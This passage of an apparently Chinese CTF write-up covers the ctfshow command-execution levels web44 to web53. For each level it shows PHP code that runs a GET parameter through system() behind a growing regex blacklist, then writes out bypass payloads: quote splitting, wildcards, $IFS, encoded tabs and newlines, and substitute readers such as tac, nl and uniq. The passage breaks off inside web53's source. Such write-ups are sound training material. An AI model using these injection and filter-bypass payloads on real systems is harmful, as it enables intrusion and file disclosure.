此题在上一题的基础上多过滤了一个 <strong>flag</strong>，因此，在构建payload的时候，flag可以使用 <strong>f?ag.php</strong> ，<strong>fl’’ag.php</strong> 或  <strong>f</strong>* 代替</p><p><strong>实验：</strong></p><p>​    payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=tac fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<span class="hljs-comment">//tac 可以替换为more less nl uniq c&#x27;&#x27;atflag 可以替换为 **f?ag.php** ，**fl&#x27;&#x27;ag.php** 或  **f*** </span><br>?c=more fl<span class="hljs-string">&#x27;&#x27;</span>ag.php%<span class="hljs-number">26</span><span class="hljs-comment">// %26 = &amp;</span><br>?c=more fl<span class="hljs-string">&#x27;&#x27;</span>ag.php%<span class="hljs-number">0</span>a<span class="hljs-comment">// %0a = 回车</span><br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/44-1.jpg"></p><h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-05 21:35:34</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    在上题的基础上过了一个空格</p><p>​    空格的代替姿势在 <code>web31</code> 中讲过，有需要的可以翻看</p><p>​    cat 和 flag 的过滤同样可以使用上一题的方法</p><p><strong>实验：</strong></p><p>​    payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=tac&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br>?c=more$IFS$<span class="hljs-number">1</span>f???.php%<span class="hljs-number">0</span>a<br>?c=less%<span class="hljs-number">09</span>f*%<span class="hljs-number">26</span><br>?c=uniq$&#123;IFS&#125;f?ag.php%<span class="hljs-number">26</span>%<span class="hljs-number">26</span><br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/45-1.jpg"></p><h2 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-05 21:50:19</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>在上题的基础上，多过滤了数字(0-9),$,*  ,也就意味着我们在绕过空格的时候没办法使用${IFS}，$IFS$1和${IFS，绕过flag 的时候不能使用 f*，其他都是和之前一样的</p><p><strong>实验：</strong></p><p>​    payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=tac&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br>?c=more%<span class="hljs-number">09</span>fl<span class="hljs-string">&#x27;&#x27;</span>ag.php%<span class="hljs-number">26</span><br>?c=less&lt;&gt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php%<span class="hljs-number">0</span>a<br></code></pre></td></tr></table></figure><h2 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-05 21:59:23</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>这题在上一题的基础上，多过滤了 <strong>more，less，head，sort，tail</strong> ，却没过滤 tac，nl，uniq</p><p><strong>实验：</strong></p><p>​    payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=uniq&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br>?c=tac&lt;&gt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php%<span class="hljs-number">0</span>a<br>?c=nl%<span class="hljs-number">09</span>fl<span class="hljs-string">&#x27;&#x27;</span>ag.php%<span class="hljs-number">26</span><br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/47-1.jpg"></p><h2 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-05 22:06:20</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    在上题的基础上，过滤更多了 <strong>cut，tail，sed，awk，strings，curl，od，`，head</strong> 发现还是没过滤tac，nl和uniq，所以继续使用上一题的payload</p><p><strong>实验：</strong></p><p>​    payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=uniq&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br>?c=tac&lt;&gt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php%<span class="hljs-number">0</span>a<br>?c=nl%<span class="hljs-number">09</span>fl<span class="hljs-string">&#x27;&#x27;</span>ag.php%<span class="hljs-number">26</span><br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/48-1.jpg"></p><h2 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-05 22:22:43</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    这题在上题的基础上又过滤了<strong>百分号(%)</strong> ，其他也没过滤，同样使用之前的方法</p><p><strong>实验：</strong></p><p>​    payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=uniq&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br>?c=tac&lt;&gt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php%<span class="hljs-number">0</span>a<br>?c=nl%<span class="hljs-number">09</span>fl<span class="hljs-string">&#x27;&#x27;</span>ag.php%<span class="hljs-number">26</span><br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/49-1.jpg"></p><h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-05 22:32:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    在上题的基础上多过滤了<strong>x26：十六进制26，x09：十六进制09</strong>  ,即过滤了 <strong>%09:tab, %26:&amp;</strong></p><p><strong>实验：</strong></p><p>​    payload：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">?c=tac%09fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br>?c=nl&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php%26<br>?c=uni<span class="hljs-string">q&lt;&gt;</span>fl<span class="hljs-string">&#x27;&#x27;</span>ag.php%0a<br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/50-1.jpg"></p><h2 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-05 22:42:52</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    此题在上题的基础上多过滤了 <strong>cat</strong> ，但是没有过滤<strong>nl 和 uniq</strong></p><p><strong>实验：</strong></p><p>​    payload：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">?c=t<span class="hljs-string">&#x27;&#x27;</span>ac&lt;&gt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br>?c=nl&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php%0a<br>?c=uni<span class="hljs-string">q&lt;&gt;</span>fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/51-1.jpg"></p><h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-05 22:50:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    在上题的基础上多过滤了 <strong>&lt; 和 &gt;</strong> 然后解除了对 <strong>$</strong> 的过滤</p><p><strong>实验：</strong></p><p>​    payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=t<span class="hljs-string">&#x27;&#x27;</span>ac$&#123;IFS&#125;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br>?c=nl<span class="hljs-variable">$IFSfl</span><span class="hljs-string">&#x27;&#x27;</span>ag.php%<span class="hljs-number">0</span>a<br>?c=uniq$&#123;IFSfl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/52-1.jpg"></p><p>发现 $flag=”flag_here” 并不是真正的flag;</p><p>扫描目录：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?c=<span class="hljs-keyword">ls</span>$&#123;IFS&#125;%0a<span class="hljs-comment">// ||</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/52-2.jpg"></p><p>扫描目录没发现有用信息；再扫描根目录试试</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?c=<span class="hljs-keyword">ls</span>$&#123;IFS&#125;/%0a<br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/52-3.jpg"></p><p>扫描根目录发现了一个 <strong>flag</strong> 文件，试着访问</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">?c=t<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-built_in">ac</span><span class="hljs-variable">$</span>&#123;IFS&#125;/<span class="hljs-built_in">fl</span><span class="hljs-string">&#x27;&#x27;</span>ag%<span class="hljs-number">0</span>a<br>?c=nl<span class="hljs-variable">$IFS</span>/<span class="hljs-built_in">fl</span><span class="hljs-string">&#x27;&#x27;</span>ag||<br>?c=uniq<span class="hljs-variable">$</span>&#123;IFS&#125;/<span class="hljs-built_in">fl</span><span class="hljs-string">&#x27;&#x27;</span>ag||<br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/52-4.jpg"></p><p>访问后发现了flag</p><h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 18:21:02</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span 